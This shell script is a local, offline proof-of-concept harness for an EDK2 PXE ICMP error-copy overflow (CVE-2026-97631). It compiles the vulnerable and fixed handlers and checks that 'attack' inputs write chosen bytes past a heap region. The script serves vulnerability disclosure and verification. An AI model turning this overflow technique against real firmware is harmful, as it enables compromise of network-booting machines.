#!/bin/sh
# Reproducible frontier harness for CVE-2026-97631 (EDK2 PXE ICMP error copy).
# No network, no UEFI build: verbatim pinned handlers + stand-in EDK2 types.
set -u
cd "$(dirname "$0")" || exit 2
HERE=$(pwd)
PASS=0
FAIL=0
TMP=${TMPDIR:-/tmp}/pxeicmp-run-$$
mkdir -p "$TMP" || exit 2
trap 'rm -rf "$TMP"' EXIT INT TERM

ok () { PASS=$((PASS+1)); echo "PASS-$PASS $1"; }
no () { FAIL=$((FAIL+1)); echo "FAIL-$FAIL $1"; }

expect_rc () {
  label=$1; want=$2; shift 2
  "$@" >"$TMP/out" 2>"$TMP/err"
  got=$?
  if [ "$got" -eq "$want" ]; then ok "$label (rc=$got)"; else no "$label (rc=$got want=$want)"; fi
}

contains () {
  label=$1; file=$2; needle=$3
  if grep -Fq "$needle" "$file"; then ok "$label"; else no "$label (missing: $needle)"; fi
}

# PASS-01 hash pins
if (cd "$HERE/.." && sha256sum -c pins/SHA256SUMS) >"$TMP/pins" 2>&1; then ok "pin SHA-256 (4/4)"; else no "pin SHA-256"; cat "$TMP/pins"; fi

# PASS-02 verbatim extraction byte-exact from pins
cp generated/extract-index.txt "$TMP/extract-index.before"
python3 extract.py >"$TMP/extract" 2>&1

if cmp -s generated/extract-index.txt "$TMP/extract-index.before"; then ok "verbatim extraction reproducible"; else no "verbatim extraction reproducible"; fi
python3 - "$HERE" <<'PY' >"$TMP/verbatim" 2>&1
import pathlib, sys, hashlib
root = pathlib.Path(sys.argv[1])
pins = root.parent / "pins"
for variant, name, span in (("vuln", "v4", (6945, 9950)), ("vuln", "v6", (10464, 13225)),
                             ("fixed", "v4", (6945, 10072)), ("fixed", "v6", (10586, 13466))):
    src = (pins / f"PxeBcSupport.c.{variant}").read_bytes().decode("utf-8")
    gen = (root / "generated" / f"handlers_{variant}.c").read_bytes().decode("utf-8")
    i, j = span
    print(f"{variant}/{name} substring={src[i:j] in gen} bytes={j-i}")
PY
if grep -q 'substring=False' "$TMP/verbatim" || [ "$(wc -l < "$TMP/verbatim")" -ne 4 ]; then no "extracted handlers are pin substrings (4/4)"; cat "$TMP/verbatim"; else ok "extracted handlers are pin substrings (4/4)"; fi

# PASS-03 compile plain + ASan, vulnerable + fixed
CC=${CC:-cc}
$CC -O0 -g -std=c11 -I. harness.c generated/handlers_vuln.c -o plain-vuln 2>"$TMP/cc1" && \
$CC -O0 -g -std=c11 -I. harness.c generated/handlers_fixed.c -o plain-fixed 2>"$TMP/cc2" && \
$CC -O0 -g -fsanitize=address -std=c11 -I. harness.c generated/handlers_vuln.c -o asan-vuln 2>"$TMP/cc3" && \
$CC -O0 -g -fsanitize=address -std=c11 -I. harness.c generated/handlers_fixed.c -o asan-fixed 2>"$TMP/cc4"
if [ $? -eq 0 ]; then ok "four builds (plain/asan x vuln/fixed)"; else no "four builds"; cat "$TMP"/cc*; fi

# PASS-04 structural offsets, both families
expect_rc "offsets v4" 0 ./plain-vuln v4 attack canary
contains "sizeof(ICMP_ERROR)=504" "$TMP/out" "sizeof_icmperror=504"
contains "TftpError offset 96" "$TMP/out" "tftp_offset=96 bytes=48 5a 4d 49"
contains "chosen bytes in adjacent live TftpError + canary" "$TMP/out" "CHOSEN_BYTES_MATCH=1"
cp "$TMP/out" evidence/plain-vuln-v4-attack.out
expect_rc "chosen bytes v6" 0 ./plain-vuln v6 attack canary
contains "chosen bytes v6" "$TMP/out" "CHOSEN_BYTES_MATCH=1"
cp "$TMP/out" evidence/plain-vuln-v6-attack.out

# PASS-05 safe input controls
expect_rc "safe input v4" 0 ./plain-vuln v4 safe canary
contains "safe v4 clean" "$TMP/out" "SAFE_CONTROL_CLEAN=1"
cp "$TMP/out" evidence/plain-vuln-v4-safe.out
expect_rc "safe input v6" 0 ./plain-vuln v6 safe canary
contains "safe v6 clean" "$TMP/out" "SAFE_CONTROL_CLEAN=1"
cp "$TMP/out" evidence/plain-vuln-v6-safe.out

# PASS-06 fixed build controls
EXPECT=unchanged
export EXPECT
EXPECT=unchanged expect_rc "fixed build v4" 0 ./plain-fixed v4 attack canary
contains "fixed v4 unchanged" "$TMP/out" "FIXED_CONTROL_CLEAN=1"
cp "$TMP/out" evidence/plain-fixed-v4-attack.out
EXPECT=unchanged expect_rc "fixed build v6" 0 ./plain-fixed v6 attack canary
contains "fixed v6 unchanged" "$TMP/out" "FIXED_CONTROL_CLEAN=1"
cp "$TMP/out" evidence/plain-fixed-v6-attack.out
# PASS-07 ASan corruption, exact 720-byte region
EXPECT=unchanged
export EXPECT

expect_rc "ASan vuln v4 aborts" 1 ./asan-vuln v4 attack heapexact
cat "$TMP/err" > evidence/asan-vuln-v4-attack.out
contains "ASan WRITE-96 v4" "$TMP/err" "WRITE of size 96"
contains "zero bytes past 720-byte region" "$TMP/err" "0 bytes after 720-byte region"
contains "verbatim pinned handler line" "$TMP/err" "handlers_vuln.c:97"
expect_rc "ASan vuln v6 aborts" 1 ./asan-vuln v6 attack heapexact
cat "$TMP/err" > evidence/asan-vuln-v6-attack.out
contains "ASan WRITE-96 v6" "$TMP/err" "WRITE of size 96"
contains "zero bytes past region v6" "$TMP/err" "0 bytes after 720-byte region"

# PASS-08 ASan fixed and safe controls
EXPECT=unchanged expect_rc "ASan fixed v4 clean" 0 ./asan-fixed v4 attack heapexact
if grep -q 'ERROR: AddressSanitizer' "$TMP/err"; then no "ASan fixed v4 no report"; else ok "ASan fixed v4 no report"; fi
cat "$TMP/out" > evidence/asan-fixed-v4-attack.out
expect_rc "ASan safe v4 clean" 0 ./asan-vuln v4 safe heapexact
if grep -q 'ERROR: AddressSanitizer' "$TMP/err"; then no "ASan safe v4 no report"; else ok "ASan safe v4 no report"; fi
cat "$TMP/out" > evidence/asan-vuln-v4-safe.out

unset EXPECT
# PASS-09 clean-archive replay from a different directory
ARCHIVE=$TMP/clean
mkdir -p "$ARCHIVE"
cp -R "$HERE/standin.h" "$HERE/harness.c" "$HERE/extract.py" "$HERE/generated" "$ARCHIVE/"
(cd "$ARCHIVE" && $CC -O0 -g -std=c11 -I. harness.c generated/handlers_vuln.c -o p && ./p v4 attack canary > replay.out 2>&1)
if grep -q 'CHOSEN_BYTES_MATCH=1' "$ARCHIVE/replay.out"; then ok "clean-archive replay (cwd-independent)"; else no "clean-archive replay"; fi

# PASS-10 source-bound mechanism markers
if grep -Fq 'CopiedLen - sizeof (EFI_PXE_BASE_CODE_ICMP_ERROR)' "$HERE/../pins/PxeBcSupport.c.vuln" && \
   grep -Fq 'FragmentLen = MIN' "$HERE/../pins/PxeBcSupport.c.fixed"; then ok "vulnerable/fixed mechanism markers in pins"; else no "mechanism markers"; fi

echo "TOTAL PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
